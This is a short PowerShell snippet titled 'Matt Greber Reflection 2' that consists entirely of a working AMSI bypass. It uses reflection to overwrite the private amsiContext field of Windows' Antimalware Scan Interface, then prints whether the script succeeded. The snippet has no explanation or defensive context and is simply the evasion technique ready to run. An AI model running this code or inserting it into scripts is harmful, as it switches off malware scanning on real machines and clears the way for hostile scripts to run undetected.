# Matt Greber Reflection 2
try {
    [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
    Write-Host "Script executed successfully"
} catch {
    Write-Host "Script execution failed: $($_.Exception.Message)"
}

